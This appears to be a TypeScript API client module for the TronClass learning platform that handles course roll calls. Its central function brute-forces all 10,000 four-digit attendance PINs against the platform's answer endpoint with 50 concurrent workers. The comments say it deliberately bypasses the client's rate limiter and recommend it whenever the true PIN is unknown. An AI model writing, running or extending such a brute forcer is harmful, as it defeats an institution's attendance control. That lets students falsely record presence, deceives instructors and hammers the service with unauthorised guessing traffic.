import type { HttpClient } from '../core/http-client.js';
import type {
  Rollcall,
  RollcallSubmitResult,
  TryRollcallResult,
  BruteForceOptions,
  BruteForceResult,
} from '../types/index.js';
import { TronClassError } from '../core/errors.js';

export class NumberCodeNotFoundError extends TronClassError {
  attempts: number;
  durationMs: number;

  constructor(attempts: number, durationMs: number) {
    super(
      `Brute-force exhausted ${attempts} attempts in ${durationMs}ms without finding a valid PIN.`,
    );
    this.name = 'NumberCodeNotFoundError';
    this.attempts = attempts;
    this.durationMs = durationMs;
    Object.setPrototypeOf(this, NumberCodeNotFoundError.prototype);
  }
}

function defaultIsMatch(r: TryRollcallResult): boolean {
  if (!r.ok) return false;

  const errorPattern = /error|fail|invalid|wrong|incorrect|not.?found|denied|錯誤|無效|失敗/i;

  const status = r.result?.status;
  if (typeof status === 'string' && errorPattern.test(status)) {
    return false;
  }

  const message = r.result?.message;
  if (typeof message === 'string' && errorPattern.test(message)) {
    return false;
  }

  return true;
}

function buildIndexQueue(start: number, end: number, shuffle: boolean): number[] {
  const arr = new Array<number>(end - start);
  for (let i = 0; i < arr.length; i++) arr[i] = start + i;

  if (shuffle) {
    for (let i = arr.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
  }
  return arr;
}

interface Activity {
  id: number;
  type: number;
  status: number;
  allow_checkin: boolean;
  course_id?: number;
  course_title?: string;
  created_by_name?: string;
  source?: string;
  created_at?: string;
  start_time?: string;
  option?: {
    answer?: string;
    [key: string]: unknown;
  };
  [key: string]: unknown;
}

export class AttendanceApi {
  constructor(
    private httpClient: HttpClient,
    private baseUrl: string,
  ) {}

  /**
   * 注意：TronClass 目前不會在此 API 穩定提供數字點名 PIN。
   */
  async getCourseRollcalls(courseId: number): Promise<Rollcall[]> {
    const data = await this.httpClient.getJson<{ rollcalls: Rollcall[] }>(
      `${this.baseUrl}/api/course/${courseId}/rollcalls`,
    );
    return data.rollcalls ?? [];
  }

  /**
   * 取得特定課程的學生個人出缺席紀錄
   */
  async getStudentRollcalls(courseId: number): Promise<unknown[]> {
    const data = await this.httpClient.getJson<{ students: unknown[] }>(
      `${this.baseUrl}/api/course/${courseId}/students_rollcalls`,
    );
    return data.students ?? [];
  }

  /**
   * 送出數字點名 PIN 碼（已知正確 PIN 時使用，失敗會丟錯）
   *
   * 若你不知道正確 PIN，請使用 {@link bruteForceNumberRollcall}。
   */
  async submitNumberRollcall(rollcallId: number, numberCode: string): Promise<RollcallSubmitResult> {
    const response = await this.httpClient.request(
      `${this.baseUrl}/api/rollcall/${rollcallId}/answer_number_rollcall`,
      {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ number_code: numberCode }),
      },
    );

    if (!response.ok) {
      const body = await response.text().catch(() => '');
      throw new Error(
        `Failed to submit rollcall: ${response.status} ${response.statusText} - ${body}`,
      );
    }

    return response.json() as Promise<RollcallSubmitResult>;
  }

  /**
   * 嘗試送出單一 PIN（不會丟錯）
   *
   * 與 {@link submitNumberRollcall} 不同：
   * - 失敗（HTTP 4xx/5xx 或業務錯誤）不會丟例外，而是回傳 `{ ok: false, ... }`
   * - 預設會跳過全域 rate limiter，讓暴力破解可以高併發運行
   * - 支援 AbortSignal 立即中止請求
   */
  async tryNumberRollcall(
    rollcallId: number,
    numberCode: string,
    options?: { signal?: AbortSignal; skipRateLimit?: boolean },
  ): Promise<TryRollcallResult> {
    try {
      const response = await this.httpClient.request(
        `${this.baseUrl}/api/rollcall/${rollcallId}/answer_number_rollcall`,
        {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ number_code: numberCode }),
          signal: options?.signal,
        },
        { skipRateLimit: options?.skipRateLimit ?? true, maxRetries: 1 },
      );

      if (!response.ok) {
        const body = await response.text().catch(() => '');
        return { ok: false, statusCode: response.status, body };
      }

      const result = (await response.json().catch(() => ({}))) as RollcallSubmitResult;
      return { ok: true, statusCode: response.status, result };
    } catch (error) {
      if (error instanceof Error && error.name === 'AbortError') {
        throw error;
      }
      const message = error instanceof Error ? error.message : String(error);
      return { ok: false, statusCode: 0, body: message };
    }
  }

  async bruteForceNumberRollcall(
    rollcallId: number,
    options: BruteForceOptions = {},
  ): Promise<BruteForceResult> {
    const concurrency = Math.max(1, options.concurrency ?? 50);
    const start = Math.max(0, options.startFrom ?? 0);
    const end = Math.min(10000, options.endAt ?? 10000);
    const total = end - start;

    if (total <= 0) {
      throw new RangeError(`Invalid PIN range: [${start}, ${end})`);
    }

    const queue = buildIndexQueue(start, end, options.shuffle ?? false);
    const isMatch = options.isMatch ?? defaultIsMatch;

    const internalAbort = new AbortController();
    const onExternalAbort = () => internalAbort.abort();
    if (options.signal) {
      if (options.signal.aborted) internalAbort.abort();
      else options.signal.addEventListener('abort', onExternalAbort, { once: true });
    }

    const startTime = Date.now();
    let cursor = 0;
    let tested = 0;
    let found: BruteForceResult | null = null;

    const worker = async (): Promise<void> => {
      while (!internalAbort.signal.aborted && !found) {
        const i = cursor++;
        if (i >= queue.length) return;

        const code = String(queue[i]).padStart(4, '0');

        let result: TryRollcallResult;
        try {
          result = await this.tryNumberRollcall(rollcallId, code, {
            signal: internalAbort.signal,
            skipRateLimit: true,
          });
        } catch (err) {
          if (err instanceof Error && err.name === 'AbortError') return;
          tested++;
          continue;
        }

        tested++;

        const matched = isMatch(result, code);
        options.onProgress?.({
          tested,
          total,
          current: code,
          found: matched,
          elapsedMs: Date.now() - startTime,
        });

        if (matched && result.ok) {
          found = {
            numberCode: code,
            result: result.result,
            attempts: tested,
            durationMs: Date.now() - startTime,
          };
          internalAbort.abort();
          return;
        }

        if (options.delayMs && options.delayMs > 0) {
          await new Promise((resolve) => setTimeout(resolve, options.delayMs));
        }
      }
    };

    try {
      const workers = Array.from(
        { length: Math.min(concurrency, total) },
        () => worker(),
      );
      await Promise.all(workers);
    } finally {
      if (options.signal) {
        options.signal.removeEventListener('abort', onExternalAbort);
      }
    }

    if (!found) {
      if (options.signal?.aborted) {
        const err = new Error('Brute-force aborted by external signal');
        err.name = 'AbortError';
        throw err;
      }
      throw new NumberCodeNotFoundError(tested, Date.now() - startTime);
    }

    return found;
  }

  /**
   * 取得目前開放簽到的點名任務
   *
   * 注意：此方法會掃描所有課程的活動，以維持原有的「全域掃描」行為。
   * TronClass 目前不會在這些列表 API 暴露數字點名 PIN，因此 number_code 會是 undefined。
   * 若需要實際的 PIN，請使用 {@link bruteForceNumberRollcall}。
   */
  async getActiveRollcalls(): Promise<Rollcall[]> {
    const coursesData = await this.httpClient.getJson<{ courses: Array<{ id: number }> }>(
      `${this.baseUrl}/api/my-courses`,
    );
    const courses = coursesData.courses ?? [];
    
    const activitiesPromises = courses.map(async (course) => {
      try {
        const data = await this.httpClient.getJson<{ activities: Activity[] }>(
          `${this.baseUrl}/api/training/activities?course_id=${course.id}`,
        );
        return data.activities ?? [];
      } catch (error) {
        console.warn(`Failed to fetch activities for course ${course.id}:`, error);
        return [];
      }
    });
    
    const allActivitiesArrays = await Promise.all(activitiesPromises);
    
    const allActivities = allActivitiesArrays.flat();
    
    const attendanceActivities = allActivities.filter(
      (activity) => 
        activity.type === 16 &&   
        activity.status === 1 &&     
        activity.allow_checkin === true  
    );
    
    return attendanceActivities.map((activity) => {
      const { type, allow_checkin, option, ...rest } = activity;
      return {
        ...rest,
        is_number: true,
        number_code: undefined,
        status: activity.status === 1 ? "on_call" : "ended",
        rollcall_time: activity.created_at ?? activity.start_time ?? new Date().toISOString(),
      };
    });
  }
}